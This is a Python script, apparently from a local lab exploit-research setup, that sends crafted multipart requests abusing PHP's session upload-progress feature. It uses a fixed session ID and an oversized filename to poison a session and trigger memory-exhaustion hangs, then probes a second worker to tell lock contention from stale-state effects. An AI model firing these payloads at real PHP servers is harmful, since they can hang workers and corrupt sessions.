#!/usr/bin/env python3
"""Hang-disambiguation: poison SID Q on worker A (conn 1); consumer on SID Q from
worker B (conn 2, bias-verified different). If worker B hangs too => flock (mechanical).
If worker B serves fine => the earlier same-worker hang was stale-state consumption."""
import socket, re, time

HOST, PORT = "127.0.0.1", 8083
B = b"GLM619"
SID_Q = b"0a1b2c3d4e5f60718293a4b5c6d7e8f9"   # fresh

def part(name, body, filename=None):
    d = b"--" + B + b"\r\n" + b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"

def pb(parts, terminate=True):
    body = b"".join(parts)
    if terminate:
        body += b"--" + B + b"--\r\n"
    return body

def post_head(blen, keep=True):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\n"
            + ("Connection: keep-alive\r\n\r\n" if keep else "Connection: close\r\n\r\n")).encode()

class KA:
    def __init__(self): self.s = socket.create_connection((HOST, PORT), timeout=30)
    def send(self, head, body=None, timeout=60):
        t0 = time.time()
        self.s.sendall(head if body is None else head + body)
        self.s.settimeout(timeout)
        buf = b""
        while True:
            he = buf.find(b"\r\n\r\n")
            if he >= 0:
                m = re.search(rb"Content-Length: (\d+)", buf[:he])
                if m and len(buf) >= he + 4 + int(m.group(1)): return buf, time.time() - t0
            try: d = self.s.recv(65536)
            except socket.timeout: return buf + b"\n<TIMEOUT>", time.time() - t0
            except ConnectionResetError: return buf + b"\n<RESET>", time.time() - t0
            if not d: return buf + b"\n<EOF>", time.time() - t0
            buf += d
    def close(self):
        try: self.s.close()
        except Exception: pass

def bias():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.sendall(b"GET /lab/index.php?probe=base HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
        s.settimeout(20)
        out = b""
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
        s.close()
        return out.split(b"\r\n\r\n", 1)[1].strip()
    except Exception as e:
        return f"ERR:{type(e).__name__}".encode()

def stat(r):
    mm = re.search(rb"tried to allocate (\d+)", r)
    return f"fatal={b'Allowed memory' in r} alloc={mm.group(1).decode() if mm else '-'} len={len(r)} ok={b'lab ok' in r}"

# worker A: poison Q
ka1 = KA()
b_a = bias()
p = pb([part(b"PHPSESSID", SID_Q), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyQ"),
        part(b"u", b"x" * 100, filename=b"G" * (420 * 1024))])
r, dt = ka1.send(post_head(len(p)), p, timeout=90)
print(f"[A poison Q] {stat(r)} t={dt:.1f}s biasA={b_a!r}", flush=True)
ka1.close()

# worker B (new conn): consumer on SID Q
b_probe = bias()
ka2 = KA()
cons = []
for i in range(10):
    cons.append(part(f"s{i}".encode(), (b"U%02d" % i).ljust(193, b"Q")))
cons.append(part(b"PHPSESSID", SID_Q))
cons.append(part(b"PHP_SESSION_UPLOAD_PROGRESS", b"keyC"))
cons.append(part(b"u", b"y", filename=b"a.txt"))
c = pb(cons)
r, dt = ka2.send(post_head(len(c)), c, timeout=45)
print(f"[B consumer Q] {stat(r)} t={dt:.1f}s", flush=True)
ka2.close()
b_after = bias()
print(f"biasB-probe={b_probe!r} bias-after={b_after!r}", flush=True)
